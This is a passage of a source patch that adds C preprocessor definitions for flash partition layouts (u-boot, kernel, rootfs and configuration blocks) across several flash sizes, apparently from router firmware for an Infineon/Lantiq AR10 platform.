+        "data_block3=" IFX_CFG_FLASH_SYSTEM_CFG_BLOCK_NAME "\0"         \
+        "data_block4=" IFX_CFG_FLASH_UBOOT_CFG_BLOCK_NAME "\0"          \
+        "data_block5=" IFX_CFG_FLASH_DECT_CFG_BLOCK_NAME "\0"      \
+        "total_db=6\0"
+        
+  #define IFX_CFG_FLASH_UBOOT_IMAGE_BLOCK_NAME           "uboot"
+  #define IFX_CFG_FLASH_UBOOT_IMAGE_START_ADDR           0x00000000
+  #define IFX_CFG_FLASH_UBOOT_IMAGE_SIZE                 0
+  #define IFX_CFG_FLASH_UBOOT_IMAGE_MTDBLOCK_NAME        "/dev/mtdblock0"
+
+  #define IFX_CFG_FLASH_ROOTFS_IMAGE_BLOCK_NAME          "rootfs"
+  #define IFX_CFG_FLASH_ROOTFS_IMAGE_START_ADDR          0x00010000
+  #define IFX_CFG_FLASH_ROOTFS_IMAGE_SIZE                0
+  #define IFX_CFG_FLASH_ROOTFS_IMAGE_MTDBLOCK_NAME       "/dev/mtdblock1"
+
+  #define IFX_CFG_FLASH_KERNEL_IMAGE_BLOCK_NAME           "kernel"
+  #define IFX_CFG_FLASH_KERNEL_IMAGE_START_ADDR           0x003EDFFF  
+  #define IFX_CFG_FLASH_KERNEL_IMAGE_SIZE                 0
+
+  #define IFX_CFG_FLASH_SYSTEM_CFG_BLOCK_NAME             "sysconfig"
+  #define IFX_CFG_FLASH_SYSTEM_CFG_START_ADDR             0x007EE000
+  #define IFX_CFG_FLASH_SYSTEM_CFG_SIZE                   0x10000
+  #define IFX_CFG_FLASH_SYSTEM_CFG_END_ADDR               0x007FDFFF
+
+  #define IFX_CFG_FLASH_UBOOT_CFG_BLOCK_NAME              "ubootconfig"
+  #define IFX_CFG_FLASH_UBOOT_CFG_START_ADDR              0x003FE000
+  #define IFX_CFG_FLASH_UBOOT_CFG_SIZE                    0x1000
+  #define IFX_CFG_FLASH_UBOOT_CFG_END_ADDR                0x003FEFFF
+
+  #define IFX_CFG_FLASH_DECT_CFG_BLOCK_NAME          "dectconfig"
+  #define IFX_CFG_FLASH_DECT_CFG_START_ADDR          0x003FF000
+  #define IFX_CFG_FLASH_DECT_CFG_SIZE                0x400
+  #define IFX_CFG_FLASH_DECT_CFG_END_ADDR            0x003FF3FF
+
+  #define IFX_CFG_FLASH_END_ADDR                          0x003FFFFF
+
+#elif (IFX_CONFIG_FLASH_SIZE == 8)
+#define IFX_CFG_FLASH_PARTITIONS_INFO                                   \
+        "part0_begin=0x00000000\0"                                      \
+        "part1_begin=0x00010000\0"                                      \
+        "total_part=2\0"
+
+#define IFX_CFG_FLASH_DATA_BLOCKS_INFO                                  \
+        "data_block0=" IFX_CFG_FLASH_UBOOT_IMAGE_BLOCK_NAME "\0"        \
+        "data_block1=" IFX_CFG_FLASH_ROOTFS_IMAGE_BLOCK_NAME "\0"       \
+        "data_block2=" IFX_CFG_FLASH_KERNEL_IMAGE_BLOCK_NAME "\0"       \
+        "data_block3=" IFX_CFG_FLASH_SYSTEM_CFG_BLOCK_NAME "\0"         \
+        "data_block4=" IFX_CFG_FLASH_UBOOT_CFG_BLOCK_NAME "\0"          \
+        "data_block5=" IFX_CFG_FLASH_DECT_CFG_BLOCK_NAME "\0"      \
+        "total_db=6\0"
+
+  #define IFX_CFG_FLASH_UBOOT_IMAGE_BLOCK_NAME            "uboot"
+  #define IFX_CFG_FLASH_UBOOT_IMAGE_START_ADDR            0x00000000
+  #define IFX_CFG_FLASH_UBOOT_IMAGE_SIZE                  0
+  #define IFX_CFG_FLASH_UBOOT_IMAGE_MTDBLOCK_NAME         "/dev/mtdblock0"
+
+  #define IFX_CFG_FLASH_ROOTFS_IMAGE_BLOCK_NAME           "rootfs"
+  #define IFX_CFG_FLASH_ROOTFS_IMAGE_START_ADDR           0x00010000
+  #define IFX_CFG_FLASH_ROOTFS_IMAGE_SIZE                 0
+  #define IFX_CFG_FLASH_ROOTFS_IMAGE_MTDBLOCK_NAME        "/dev/mtdblock1"
+
+  #define IFX_CFG_FLASH_KERNEL_IMAGE_BLOCK_NAME           "kernel"
+  #define IFX_CFG_FLASH_KERNEL_IMAGE_START_ADDR           0x007EDFFF
+  #define IFX_CFG_FLASH_KERNEL_IMAGE_SIZE                 0
+
+  #define IFX_CFG_FLASH_SYSTEM_CFG_BLOCK_NAME             "sysconfig"
+  #define IFX_CFG_FLASH_SYSTEM_CFG_START_ADDR             0x007EE000
+  #define IFX_CFG_FLASH_SYSTEM_CFG_SIZE                   0x10000
+  #define IFX_CFG_FLASH_SYSTEM_CFG_END_ADDR               0x007FDFFF
+
+  #define IFX_CFG_FLASH_UBOOT_CFG_BLOCK_NAME              "ubootconfig"
+  #define IFX_CFG_FLASH_UBOOT_CFG_START_ADDR              0x007FE000
+  #define IFX_CFG_FLASH_UBOOT_CFG_SIZE                    0x1000
+  #define IFX_CFG_FLASH_UBOOT_CFG_END_ADDR                0x007FEFFF
+
+  #define IFX_CFG_FLASH_DECT_CFG_BLOCK_NAME          "dectconfig"
+  #define IFX_CFG_FLASH_DECT_CFG_START_ADDR          0x007FF000
+  #define IFX_CFG_FLASH_DECT_CFG_SIZE                0x400
+  #define IFX_CFG_FLASH_DECT_CFG_END_ADDR            0x007FF3FF
+
+ 
+  #define IFX_CFG_FLASH_END_ADDR                         0x007FFFFF
+
+#elif (IFX_CONFIG_FLASH_SIZE == 128)
+#define IFX_CFG_FLASH_PARTITIONS_INFO                                   \
+        "part0_begin=0x00000000\0"                                      \
+        "part1_begin=0x00040000\0"                                      \
+        "part2_begin=0x002C0000\0"                                      \
+        "part3_begin=0x07000000\0"                                      \
+        "part4_begin=0x07040000\0"                                      \
+        "part5_begin=0x07080000\0"                                      \
+        "total_part=6\0"
+
+#define IFX_CFG_FLASH_DATA_BLOCKS_INFO                                  \
+        "data_block0=" IFX_CFG_FLASH_UBOOT_IMAGE_BLOCK_NAME "\0"        \
+        "data_block1=" IFX_CFG_FLASH_KERNEL_IMAGE_BLOCK_NAME "\0"       \
+        "data_block2=" IFX_CFG_FLASH_ROOTFS_IMAGE_BLOCK_NAME "\0"       \
+        "data_block3=" IFX_CFG_FLASH_SYSTEM_CFG_BLOCK_NAME "\0"         \
+        "data_block4=" IFX_CFG_FLASH_UBOOT_CFG_BLOCK_NAME "\0"          \
+        "data_block5=" IFX_CFG_FLASH_DECT_CFG_BLOCK_NAME "\0"      \
+        "total_db=6\0"
+
+  #define IFX_CFG_FLASH_UBOOT_IMAGE_BLOCK_NAME            "uboot"
+  #define IFX_CFG_FLASH_UBOOT_IMAGE_START_ADDR            0x00000000
+  #define IFX_CFG_FLASH_UBOOT_IMAGE_SIZE                  0x40000
+  #define IFX_CFG_FLASH_UBOOT_IMAGE_MTDBLOCK_NAME         "/dev/mtdblock0"
+
+  #define IFX_CFG_FLASH_KERNEL_IMAGE_BLOCK_NAME           "kernel"
+  #define IFX_CFG_FLASH_KERNEL_IMAGE_START_ADDR           0x00040000
+  #define IFX_CFG_FLASH_KERNEL_IMAGE_SIZE                 0
+  #define IFX_CFG_FLASH_KERNEL_IMAGE_MTDBLOCK_NAME        "/dev/mtdblock1"
+
+  #define IFX_CFG_FLASH_ROOTFS_IMAGE_BLOCK_NAME           "rootfs"
+  #define IFX_CFG_FLASH_ROOTFS_IMAGE_START_ADDR           0x002C0000
+  #define IFX_CFG_FLASH_ROOTFS_IMAGE_SIZE                 0
+  #define IFX_CFG_FLASH_ROOTFS_IMAGE_MTDBLOCK_NAME        "/dev/mtdblock2"
+
+  #define IFX_CFG_FLASH_SYSTEM_CFG_BLOCK_NAME             "sysconfig"
+  #define IFX_CFG_FLASH_SYSTEM_CFG_START_ADDR             0x07000000
+  #define IFX_CFG_FLASH_SYSTEM_CFG_SIZE                   0x10000
+  #define IFX_CFG_FLASH_SYSTEM_CFG_END_ADDR               0x0700FFFF
+  #define IFX_CFG_FLASH_SYSTEM_CFG_MTDBLOCK_NAME          "/dev/mtdblock3"
+
+  #define IFX_CFG_FLASH_UBOOT_CFG_BLOCK_NAME              "ubootconfig"
+  #define IFX_CFG_FLASH_UBOOT_CFG_START_ADDR              0x07040000
+  #define IFX_CFG_FLASH_UBOOT_CFG_SIZE                    0x1000
+  #define IFX_CFG_FLASH_UBOOT_CFG_END_ADDR                0x07040FFF
+  #define IFX_CFG_FLASH_UBOOT_CFG_MTDBLOCK_NAME           "/dev/mtdblock4"
+
+  #define IFX_CFG_FLASH_DECT_CFG_BLOCK_NAME          "dectconfig"
+  #define IFX_CFG_FLASH_DECT_CFG_START_ADDR          0x07080000
+  #define IFX_CFG_FLASH_DECT_CFG_SIZE                0x400
+  #define IFX_CFG_FLASH_DECT_CFG_END_ADDR            0x0708003FF
+  #define IFX_CFG_FLASH_DECT_CFG_MTDBLOCK_NAME       "/dev/mtdblock5"
+
+  #define IFX_CFG_FLASH_END_ADDR                         0x07FFFFFF
+
+#elif (IFX_CONFIG_FLASH_SIZE == 512)
+#define IFX_CFG_FLASH_PARTITIONS_INFO                                   \
+        "part0_begin=0x00000000\0"                                      \
+        "part1_begin=0x00010000\0"                                      \
+        "total_part=2\0"
+
+#define IFX_CFG_FLASH_DATA_BLOCKS_INFO                                  \
+        "data_block0=" IFX_CFG_FLASH_UBOOT_IMAGE_BLOCK_NAME "\0"        \
+        "data_block1=" IFX_CFG_FLASH_ROOTFS_IMAGE_BLOCK_NAME "\0"       \
+        "data_block2=" IFX_CFG_FLASH_KERNEL_IMAGE_BLOCK_NAME "\0"       \
+        "data_block3=" IFX_CFG_FLASH_SYSTEM_CFG_BLOCK_NAME "\0"         \
+        "data_block4=" IFX_CFG_FLASH_UBOOT_CFG_BLOCK_NAME "\0"          \
+        "data_block5=" IFX_CFG_FLASH_DECT_CFG_BLOCK_NAME "\0"      \
+        "total_db=6\0"
+
+  #define IFX_CFG_FLASH_UBOOT_IMAGE_BLOCK_NAME            "uboot"
+  #define IFX_CFG_FLASH_UBOOT_IMAGE_START_ADDR            0x00000000
+  #define IFX_CFG_FLASH_UBOOT_IMAGE_SIZE                  0x40000
+  #define IFX_CFG_FLASH_UBOOT_IMAGE_MTDBLOCK_NAME         "/dev/mtdblock0"
+
+  #define IFX_CFG_FLASH_ROOTFS_IMAGE_BLOCK_NAME           "rootfs"
+  #define IFX_CFG_FLASH_ROOTFS_IMAGE_START_ADDR           0x00040000
+  #define IFX_CFG_FLASH_ROOTFS_IMAGE_SIZE                 0
+  #define IFX_CFG_FLASH_ROOTFS_IMAGE_MTDBLOCK_NAME        "/dev/mtdblock1"
+
+  #define IFX_CFG_FLASH_KERNEL_IMAGE_BLOCK_NAME           "kernel"
+  #define IFX_CFG_FLASH_KERNEL_IMAGE_START_ADDR           0x007EDFFF
+  #define IFX_CFG_FLASH_KERNEL_IMAGE_SIZE                 0
+
+  #define IFX_CFG_FLASH_SYSTEM_CFG_BLOCK_NAME             "sysconfig"
+  #define IFX_CFG_FLASH_SYSTEM_CFG_START_ADDR             0x007EE000
+  #define IFX_CFG_FLASH_SYSTEM_CFG_SIZE                   0x10000
+  #define IFX_CFG_FLASH_SYSTEM_CFG_END_ADDR               0x007FDFFF
+
+  #define IFX_CFG_FLASH_UBOOT_CFG_BLOCK_NAME              "ubootconfig"
+  #define IFX_CFG_FLASH_UBOOT_CFG_START_ADDR              0x007FE000
+  #define IFX_CFG_FLASH_UBOOT_CFG_SIZE                    0x1000
+  #define IFX_CFG_FLASH_UBOOT_CFG_END_ADDR                0x007FEFFF
+
+  #define IFX_CFG_FLASH_DECT_CFG_BLOCK_NAME          "dectconfig"
+  #define IFX_CFG_FLASH_DECT_CFG_START_ADDR          0x007FF000
+  #define IFX_CFG_FLASH_DECT_CFG_SIZE                0x400
+  #define IFX_CFG_FLASH_DECT_CFG_END_ADDR            0x007FF3FF
+
+  #define IFX_CFG_FLASH_END_ADDR                         0x007FFFFF
+
+
+#else
+  #error "ERROR!! Define flash size first!"
+#endif
+
+#else /*Not defined CONFIG_FIRMWARE_IN_ROOTFS*/
+//2MB flash partition
+#if (IFX_CONFIG_FLASH_SIZE == 2)
+#define IFX_CFG_FLASH_PARTITIONS_INFO                                   \
+        "part0_begin=0x00000000\0"                                      \
+        "part1_begin=0x00010000\0"                                      \
+        "part2_begin=0x00040000\0"                                      \
+        "total_part=3\0"
+
+#define IFX_CFG_FLASH_DATA_BLOCKS_INFO          \
+  "data_block0=" IFX_CFG_FLASH_UBOOT_IMAGE_BLOCK_NAME "\0"  \
+  "data_block1=" IFX_CFG_FLASH_FIRMWARE_IMAGE_BLOCK_NAME "\0" \
+  "data_block2=" IFX_CFG_FLASH_ROOTFS_IMAGE_BLOCK_NAME "\0" \
+  "data_block3=" IFX_CFG_FLASH_KERNEL_IMAGE_BLOCK_NAME "\0" \
+  "data_block4=" IFX_CFG_FLASH_SYSTEM_CFG_BLOCK_NAME "\0"   \
+  "data_block5=" IFX_CFG_FLASH_UBOOT_CFG_BLOCK_NAME "\0"    \
+  "data_block6=" IFX_CFG_FLASH_DECT_CFG_BLOCK_NAME "\0"  \
+  "total_db=7\0"
+
+  #define IFX_CFG_FLASH_UBOOT_IMAGE_BLOCK_NAME          "uboot"
+  #define IFX_CFG_FLASH_UBOOT_IMAGE_START_ADDR          0x00000000
+  #define IFX_CFG_FLASH_UBOOT_IMAGE_SIZE                0
+  #define IFX_CFG_FLASH_UBOOT_IMAGE_MTDBLOCK_NAME       "/dev/mtdblock0"
+
+  #define IFX_CFG_FLASH_FIRMWARE_IMAGE_BLOCK_NAME       "firmware"
+  #define IFX_CFG_FLASH_FIRMWARE_IMAGE_START_ADDR       0x00010000
+  #define IFX_CFG_FLASH_FIRMWARE_IMAGE_SIZE             0
+  #define IFX_CFG_FLASH_FIRMWARE_IMAGE_MTDBLOCK_NAME    "/dev/mtdblock1"
+
+  #define IFX_CFG_FLASH_ROOTFS_IMAGE_BLOCK_NAME         "rootfs"
+  #define IFX_CFG_FLASH_ROOTFS_IMAGE_START_ADDR         0x00040000
+  #define IFX_CFG_FLASH_ROOTFS_IMAGE_SIZE               0
+  #define IFX_CFG_FLASH_ROOTFS_IMAGE_MTDBLOCK_NAME      "/dev/mtdblock2"
+
+  #define IFX_CFG_FLASH_KERNEL_IMAGE_BLOCK_NAME         "kernel"
+  #define IFX_CFG_FLASH_KERNEL_IMAGE_START_ADDR         0x001FADFF
+  #define IFX_CFG_FLASH_KERNEL_IMAGE_SIZE               0
+
+  #define IFX_CFG_FLASH_SYSTEM_CFG_BLOCK_NAME           "sysconfig"
+  #define IFX_CFG_FLASH_SYSTEM_CFG_START_ADDR           0x001FAE00
+  #define IFX_CFG_FLASH_SYSTEM_CFG_SIZE                 0x4000
+  #define IFX_CFG_FLASH_SYSTEM_CFG_END_ADDR             0x001FEDFF
+
+  #define IFX_CFG_FLASH_UBOOT_CFG_BLOCK_NAME            "ubootconfig"
+  #define IFX_CFG_FLASH_UBOOT_CFG_START_ADDR            0x001FEE00
+  #define IFX_CFG_FLASH_UBOOT_CFG_SIZE                  0x1000
+  #define IFX_CFG_FLASH_UBOOT_CFG_END_ADDR              0x001FFDFF
+
+  #define IFX_CFG_FLASH_DECT_CFG_BLOCK_NAME        "dectconfig"
+  #define IFX_CFG_FLASH_DECT_CFG_START_ADDR        0x001FFE00
+  #define IFX_CFG_FLASH_DECT_CFG_SIZE              0x0200
+  #define IFX_CFG_FLASH_DECT_CFG_END_ADDR          0x001FFFFF
+
+  #define IFX_CFG_FLASH_END_ADDR                        0x001FFFFF
+
+//4MB flash partition
+#elif (IFX_CONFIG_FLASH_SIZE == 4)
+#define IFX_CFG_FLASH_PARTITIONS_INFO                                   \
+        "part0_begin=0x00000000\0"                                      \
+        "part1_begin=0x00010000\0"                                      \
+        "part2_begin=0x00040000\0"                                      \
+        "total_part=3\0"
+
+#define IFX_CFG_FLASH_DATA_BLOCKS_INFO                                  \
+        "data_block0=" IFX_CFG_FLASH_UBOOT_IMAGE_BLOCK_NAME "\0"        \
+        "data_block1=" IFX_CFG_FLASH_FIRMWARE_IMAGE_BLOCK_NAME "\0"     \
+        "data_block2=" IFX_CFG_FLASH_ROOTFS_IMAGE_BLOCK_NAME "\0"       \
+        "data_block3=" IFX_CFG_FLASH_KERNEL_IMAGE_BLOCK_NAME "\0"       \
+        "data_block4=" IFX_CFG_FLASH_SYSTEM_CFG_BLOCK_NAME "\0"         \
+        "data_block5=" IFX_CFG_FLASH_UBOOT_CFG_BLOCK_NAME "\0"          \
+        "data_block6=" IFX_CFG_FLASH_DECT_CFG_BLOCK_NAME "\0"      \
+        "total_db=7\0"
+
+  #define IFX_CFG_FLASH_UBOOT_IMAGE_BLOCK_NAME           "uboot"
+  #define IFX_CFG_FLASH_UBOOT_IMAGE_START_ADDR           0x00000000
+  #define IFX_CFG_FLASH_UBOOT_IMAGE_SIZE                 0
+  #define IFX_CFG_FLASH_UBOOT_IMAGE_MTDBLOCK_NAME        "/dev/mtdblock0"
+
+  #define IFX_CFG_FLASH_FIRMWARE_IMAGE_BLOCK_NAME        "firmware"
+  #define IFX_CFG_FLASH_FIRMWARE_IMAGE_START_ADDR        0x00010000
+  #define IFX_CFG_FLASH_FIRMWARE_IMAGE_SIZE              0
+  #define IFX_CFG_FLASH_FIRMWARE_IMAGE_MTDBLOCK_NAME     "/dev/mtdblock1"
+
+  #define IFX_CFG_FLASH_ROOTFS_IMAGE_BLOCK_NAME          "rootfs"
+  #define IFX_CFG_FLASH_ROOTFS_IMAGE_START_ADDR          0x00040000
+  #define IFX_CFG_FLASH_ROOTFS_IMAGE_SIZE                0
+  #define IFX_CFG_FLASH_ROOTFS_IMAGE_MTDBLOCK_NAME       "/dev/mtdblock2"
+
+  #define IFX_CFG_FLASH_KERNEL_IMAGE_BLOCK_NAME           "kernel"
+  #define IFX_CFG_FLASH_KERNEL_IMAGE_START_ADDR           0x003EDFFF
+  #define IFX_CFG_FLASH_KERNEL_IMAGE_SIZE                 0
+
+  #define IFX_CFG_FLASH_SYSTEM_CFG_BLOCK_NAME             "sysconfig"
+  #define IFX_CFG_FLASH_SYSTEM_CFG_START_ADDR             0x003EE000
+  #define IFX_CFG_FLASH_SYSTEM_CFG_SIZE                   0x10000
+  #define IFX_CFG_FLASH_SYSTEM_CFG_END_ADDR               0x003FDFFF
+
+  #define IFX_CFG_FLASH_UBOOT_CFG_BLOCK_NAME              "ubootconfig"
+  #define IFX_CFG_FLASH_UBOOT_CFG_START_ADDR              0x003FE000
+  #define IFX_CFG_FLASH_UBOOT_CFG_SIZE                    0x1000
+  #define IFX_CFG_FLASH_UBOOT_CFG_END_ADDR                0x003FEFFF
+
+  #define IFX_CFG_FLASH_DECT_CFG_BLOCK_NAME          "dectconfig"
+  #define IFX_CFG_FLASH_DECT_CFG_START_ADDR          0x003FF000
+  #define IFX_CFG_FLASH_DECT_CFG_SIZE                0x400
+  #define IFX_CFG_FLASH_DECT_CFG_END_ADDR            0x003FF3FF
+  
+  #define IFX_CFG_FLASH_END_ADDR                         0x003FFFFF
+
+#elif (IFX_CONFIG_FLASH_SIZE == 8)
+#define IFX_CFG_FLASH_PARTITIONS_INFO                                   \
+        "part0_begin=0x00000000\0"                                      \
+        "part1_begin=0x00010000\0"                                      \
+        "part2_begin=0x00050000\0"                                      \
+        "total_part=3\0"
+
+#define IFX_CFG_FLASH_DATA_BLOCKS_INFO                                  \
+        "data_block0=" IFX_CFG_FLASH_UBOOT_IMAGE_BLOCK_NAME "\0"        \
+        "data_block1=" IFX_CFG_FLASH_FIRMWARE_IMAGE_BLOCK_NAME "\0"     \
+        "data_block2=" IFX_CFG_FLASH_ROOTFS_IMAGE_BLOCK_NAME "\0"       \
+        "data_block3=" IFX_CFG_FLASH_KERNEL_IMAGE_BLOCK_NAME "\0"       \
+        "data_block4=" IFX_CFG_FLASH_SYSTEM_CFG_BLOCK_NAME "\0"         \
+        "data_block5=" IFX_CFG_FLASH_UBOOT_CFG_BLOCK_NAME "\0"          \
+        "data_block6=" IFX_CFG_FLASH_DECT_CFG_BLOCK_NAME "\0"      \
+        "total_db=7\0"
+
+  #define IFX_CFG_FLASH_UBOOT_IMAGE_BLOCK_NAME            "uboot"
+  #define IFX_CFG_FLASH_UBOOT_IMAGE_START_ADDR            0x00000000
+  #define IFX_CFG_FLASH_UBOOT_IMAGE_SIZE                  0
+  #define IFX_CFG_FLASH_UBOOT_IMAGE_MTDBLOCK_NAME         "/dev/mtdblock0"
+
+  #define IFX_CFG_FLASH_FIRMWARE_IMAGE_BLOCK_NAME         "firmware"
+  #define IFX_CFG_FLASH_FIRMWARE_IMAGE_START_ADDR         0x00010000
+  #define IFX_CFG_FLASH_FIRMWARE_IMAGE_SIZE               0
+  #define IFX_CFG_FLASH_FIRMWARE_IMAGE_MTDBLOCK_NAME      "/dev/mtdblock1"
+
+  #define IFX_CFG_FLASH_ROOTFS_IMAGE_BLOCK_NAME           "rootfs"
+  #define IFX_CFG_FLASH_ROOTFS_IMAGE_START_ADDR           0x00050000
+  #define IFX_CFG_FLASH_ROOTFS_IMAGE_SIZE                 0
+  #define IFX_CFG_FLASH_ROOTFS_IMAGE_MTDBLOCK_NAME        "/dev/mtdblock2"
+
+  #define IFX_CFG_FLASH_KERNEL_IMAGE_BLOCK_NAME           "kernel"
+  #define IFX_CFG_FLASH_KERNEL_IMAGE_START_ADDR           0x007EDFFF
+  #define IFX_CFG_FLASH_KERNEL_IMAGE_SIZE                 0
+
+  #define IFX_CFG_FLASH_SYSTEM_CFG_BLOCK_NAME             "sysconfig"
+  #define IFX_CFG_FLASH_SYSTEM_CFG_START_ADDR             0x007EE000
+  #define IFX_CFG_FLASH_SYSTEM_CFG_SIZE                   0x10000
+  #define IFX_CFG_FLASH_SYSTEM_CFG_END_ADDR               0x007FDFFF
+
+  #define IFX_CFG_FLASH_UBOOT_CFG_BLOCK_NAME              "ubootconfig"
+  #define IFX_CFG_FLASH_UBOOT_CFG_START_ADDR              0x007FE000
+  #define IFX_CFG_FLASH_UBOOT_CFG_SIZE                    0x1000
+  #define IFX_CFG_FLASH_UBOOT_CFG_END_ADDR                0x007FEFFF
+
+  #define IFX_CFG_FLASH_DECT_CFG_BLOCK_NAME          "dectconfig"
+  #define IFX_CFG_FLASH_DECT_CFG_START_ADDR          0x007FF000
+  #define IFX_CFG_FLASH_DECT_CFG_SIZE                0x400
+  #define IFX_CFG_FLASH_DECT_CFG_END_ADDR            0x007FF3FF
+  
+ 
+  #define IFX_CFG_FLASH_END_ADDR                          0x007FFFFF
+  
+#elif (IFX_CONFIG_FLASH_SIZE == 128) && !(defined CONFIG_NAND_ECC_HW)
+#if !defined( CONFIG_AR10_GPHY_FW_EMBEDDED )
+#define IFX_CFG_FLASH_PARTITIONS_INFO                                   \
+        "part0_begin=0x00000000\0"                                      \
+        "part1_begin=0x00040000\0"                                      \
+        "part2_begin=0x00060000\0"                                      \
+        "part3_begin=0x000e0000\0"                                      \
+        "part4_begin=0x002e0000\0"                                      \
+        "part5_begin=0x07000000\0"                                      \
+        "part6_begin=0x07040000\0"                                      \
+        "part7_begin=0x07080000\0"                                      \
+        "total_part=8\0"
+#else
+#define IFX_CFG_FLASH_PARTITIONS_INFO                                   \
+        "part0_begin=0x00000000\0"                                      \
+        "part1_begin=0x00040000\0"                                      \
+        "part2_begin=0x000C0000\0"                                      \
+        "part3_begin=0x002C0000\0"                                      \
+        "part4_begin=0x07000000\0"                                      \
+        "part5_begin=0x07040000\0"                                      \
+        "part6_begin=0x07080000\0"                                      \
+        "total_part=7\0"
+#endif
+
+#if !defined( CONFIG_AR10_GPHY_FW_EMBEDDED )
+#define IFX_CFG_FLASH_DATA_BLOCKS_INFO                                  \
+        "data_block0=" IFX_CFG_FLASH_UBOOT_IMAGE_BLOCK_NAME "\0"        \
+        "data_block1=" IFX_CFG_FLASH_GPHY_FIRMWARE_IMAGE_BLOCK_NAME "\0"        \
+        "data_block2=" IFX_CFG_FLASH_FIRMWARE_IMAGE_BLOCK_NAME "\0"     \
+        "data_block3=" IFX_CFG_FLASH_KERNEL_IMAGE_BLOCK_NAME "\0"       \
+        "data_block4=" IFX_CFG_FLASH_ROOTFS_IMAGE_BLOCK_NAME "\0"       \
+        "data_block5=" IFX_CFG_FLASH_SYSTEM_CFG_BLOCK_NAME "\0"         \
+        "data_block6=" IFX_CFG_FLASH_UBOOT_CFG_BLOCK_NAME "\0"          \
+        "data_block7=" IFX_CFG_FLASH_DECT_CFG_BLOCK_NAME "\0"      \
+        "total_db=8\0"
+#else
+#define IFX_CFG_FLASH_DATA_BLOCKS_INFO                                  \
+        "data_block0=" IFX_CFG_FLASH_UBOOT_IMAGE_BLOCK_NAME "\0"        \
+        "data_block1=" IFX_CFG_FLASH_FIRMWARE_IMAGE_BLOCK_NAME "\0"     \
+        "data_block2=" IFX_CFG_FLASH_KERNEL_IMAGE_BLOCK_NAME "\0"       \
+        "data_block3=" IFX_CFG_FLASH_ROOTFS_IMAGE_BLOCK_NAME "\0"       \
+        "data_block4=" IFX_CFG_FLASH_SYSTEM_CFG_BLOCK_NAME "\0"         \
+        "data_block5=" IFX_CFG_FLASH_UBOOT_CFG_BLOCK_NAME "\0"          \
+        "data_block6=" IFX_CFG_FLASH_DECT_CFG_BLOCK_NAME "\0"      \
+        "total_db=7\0"
+#endif
+
+
+    #define IFX_CFG_FLASH_UBOOT_IMAGE_BLOCK_NAME            "uboot"
+  #define IFX_CFG_FLASH_UBOOT_IMAGE_START_ADDR            0x00000000
+  #define IFX_CFG_FLASH_UBOOT_IMAGE_SIZE                  0
+  #define IFX_CFG_FLASH_UBOOT_IMAGE_MTDBLOCK_NAME         "/dev/mtdblock0"
+
+#if !defined( CONFIG_AR10_GPHY_FW_EMBEDDED )
+  #define IFX_CFG_FLASH_GPHY_FIRMWARE_IMAGE_BLOCK_NAME            "gphy_firmware"
+  #define IFX_CFG_FLASH_GPHY_FIRMWARE_IMAGE_START_ADDR            0x80000
+  #define IFX_CFG_FLASH_GPHY_FIRMWARE_IMAGE_SIZE                  0
+  #define IFX_CFG_FLASH_GPHY_FIRMWARE_IMAGE_MTDBLOCK_NAME         "/dev/mtdblock1"
+#endif
+
+#if !defined( CONFIG_AR10_GPHY_FW_EMBEDDED )
+  #define IFX_CFG_FLASH_FIRMWARE_IMAGE_BLOCK_NAME         "firmware"
+  #define IFX_CFG_FLASH_FIRMWARE_IMAGE_START_ADDR         0x000a0000
+  #define IFX_CFG_FLASH_FIRMWARE_IMAGE_SIZE               0
+  #define IFX_CFG_FLASH_FIRMWARE_IMAGE_MTDBLOCK_NAME      "/dev/mtdblock2"
+#else
+  #define IFX_CFG_FLASH_FIRMWARE_IMAGE_BLOCK_NAME         "firmware"
+  #define IFX_CFG_FLASH_FIRMWARE_IMAGE_START_ADDR         0x00040000
+  #define IFX_CFG_FLASH_FIRMWARE_IMAGE_SIZE               0
+  #define IFX_CFG_FLASH_FIRMWARE_IMAGE_MTDBLOCK_NAME      "/dev/mtdblock1"
+#endif
+
+#if !defined( CONFIG_AR10_GPHY_FW_EMBEDDED )
+  #define IFX_CFG_FLASH_KERNEL_IMAGE_BLOCK_NAME           "kernel"
+  #define IFX_CFG_FLASH_KERNEL_IMAGE_START_ADDR           0x00120000
+  #define IFX_CFG_FLASH_KERNEL_IMAGE_SIZE                 0
+  #define IFX_CFG_FLASH_KERNEL_IMAGE_MTDBLOCK_NAME        "/dev/mtdblock3"
+#else
+  #define IFX_CFG_FLASH_KERNEL_IMAGE_BLOCK_NAME           "kernel"
+  #define IFX_CFG_FLASH_KERNEL_IMAGE_START_ADDR           0x000C0000
+  #define IFX_CFG_FLASH_KERNEL_IMAGE_SIZE                 0
+  #define IFX_CFG_FLASH_KERNEL_IMAGE_MTDBLOCK_NAME        "/dev/mtdblock2"
+#endif
+
+#if !defined( CONFIG_AR10_GPHY_FW_EMBEDDED )
+  #define IFX_CFG_FLASH_ROOTFS_IMAGE_BLOCK_NAME           "rootfs"
+  #define IFX_CFG_FLASH_ROOTFS_IMAGE_START_ADDR           0x00320000
+  #define IFX_CFG_FLASH_ROOTFS_IMAGE_SIZE                 0
+  #define IFX_CFG_FLASH_ROOTFS_IMAGE_MTDBLOCK_NAME        "/dev/mtdblock4"
+#else
+  #define IFX_CFG_FLASH_ROOTFS_IMAGE_BLOCK_NAME           "rootfs"
+  #define IFX_CFG_FLASH_ROOTFS_IMAGE_START_ADDR           0x002C0000
+  #define IFX_CFG_FLASH_ROOTFS_IMAGE_SIZE                 0
+  #define IFX_CFG_FLASH_ROOTFS_IMAGE_MTDBLOCK_NAME        "/dev/mtdblock3"
+#endif
+
+  #define IFX_CFG_FLASH_SYSTEM_CFG_BLOCK_NAME             "sysconfig"
+  #define IFX_CFG_FLASH_SYSTEM_CFG_START_ADDR             0x07000000
+  #define IFX_CFG_FLASH_SYSTEM_CFG_SIZE                   0x10000
+  #define IFX_CFG_FLASH_SYSTEM_CFG_END_ADDR               0x0700FFFF
+  #define IFX_CFG_FLASH_SYSTEM_CFG_MTDBLOCK_NAME          "/dev/mtdblock4"
+
+  #define IFX_CFG_FLASH_UBOOT_CFG_BLOCK_NAME              "ubootconfig"
+  #define IFX_CFG_FLASH_UBOOT_CFG_START_ADDR              0x07040000
+  #define IFX_CFG_FLASH_UBOOT_CFG_SIZE                    0x1000
+  #define IFX_CFG_FLASH_UBOOT_CFG_END_ADDR                0x07040FFF
+  #define IFX_CFG_FLASH_UBOOT_CFG_MTDBLOCK_NAME           "/dev/mtdblock5"
+
+  #define IFX_CFG_FLASH_DECT_CFG_BLOCK_NAME          "dectconfig"
+  #define IFX_CFG_FLASH_DECT_CFG_START_ADDR          0x07080000
+  #define IFX_CFG_FLASH_DECT_CFG_SIZE                0x400
